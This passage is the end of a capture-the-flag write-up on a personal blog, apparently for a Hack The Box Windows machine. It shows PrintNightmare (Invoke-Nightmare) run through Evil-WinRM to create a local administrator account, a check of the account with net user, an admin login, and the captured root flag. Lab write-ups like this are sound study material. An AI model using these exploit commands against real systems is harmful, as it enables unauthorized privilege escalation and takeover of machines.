+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\P</span>rivesc&gt; Invoke-Nightmare -DriverName <span style="color:#e6db74">&#34;Driver&#34;</span> -NewUser <span style="color:#e6db74">&#34;l0gan334&#34;</span> -NewPassword <span style="color:#e6db74">&#34;l0gan334&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> created payload at C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>ony<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\n</span>ightmare.dll
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> using pDriverPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> added user l0gan334 as local administrator
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> deleting payload from C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>ony<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\n</span>ightmare.dll
+</span></span></code></pre></div><p>We don&rsquo;t get any errors so let&rsquo;s check if the user <em>l0gan334</em> was created:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\P</span>rivesc&gt; net user
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User accounts <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">\\</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>Administrator            DefaultAccount           Guest
+</span></span><span style="display:flex;"><span>l0gan334                 tony
+</span></span><span style="display:flex;"><span>The command completed with one or more errors.
+</span></span></code></pre></div><p>And there it is, it should also be inside <strong>Administrators</strong> group:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\P</span>rivesc&gt; net user l0gan334
+</span></span><span style="display:flex;"><span>User name                    l0gan334
+</span></span><span style="display:flex;"><span>Full Name                    l0gan334
+</span></span><span style="display:flex;"><span>Comment
+</span></span><span style="display:flex;"><span>User<span style="color:#960050;background-color:#1e0010">&#39;</span>s comment
+</span></span><span style="display:flex;"><span>Country/region code          <span style="color:#ae81ff">000</span> <span style="color:#f92672">(</span>System Default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Account active               Yes
+</span></span><span style="display:flex;"><span>Account expires              Never
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Password last set            7/8/2022 4:22:34 AM
+</span></span><span style="display:flex;"><span>Password expires             Never
+</span></span><span style="display:flex;"><span>Password changeable          7/8/2022 4:22:34 AM
+</span></span><span style="display:flex;"><span>Password required            Yes
+</span></span><span style="display:flex;"><span>User may change password     Yes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Workstations allowed         All
+</span></span><span style="display:flex;"><span>Logon script
+</span></span><span style="display:flex;"><span>User profile
+</span></span><span style="display:flex;"><span>Home directory
+</span></span><span style="display:flex;"><span>Last logon                   Never
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Logon hours allowed          All
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Local Group Memberships      *Administrators
+</span></span><span style="display:flex;"><span>Global Group memberships     *None
+</span></span><span style="display:flex;"><span>The command completed successfully.
+</span></span></code></pre></div><p>Perfect! Now we can login as an admin with <strong>evil-winrm</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ evil-winrm -i 10.129.61.40 -u <span style="color:#e6db74">&#39;l0gan334&#39;</span> -p <span style="color:#e6db74">&#39;l0gan334&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:sers<span style="color:#ae81ff">\l</span>0gan334<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>And finally, the <strong>root.txt</strong> is waiting for us in the admin&rsquo;s desktop:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-ar---         7/8/2022   1:38 AM             <span style="color:#ae81ff">34</span> root.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; type root.txt
+</span></span><span style="display:flex;"><span>192c8e9fba8ecc1c92901f2bd9892084
+</span></span></code></pre></div><p>See you next time!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://theloganlab.github.io/posts/epsilon/">
+                <span class="button__text">Epsilon - Write up</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+<script src="https://theloganlab.github.io/assets/main.js"></script>
+<script src="https://theloganlab.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
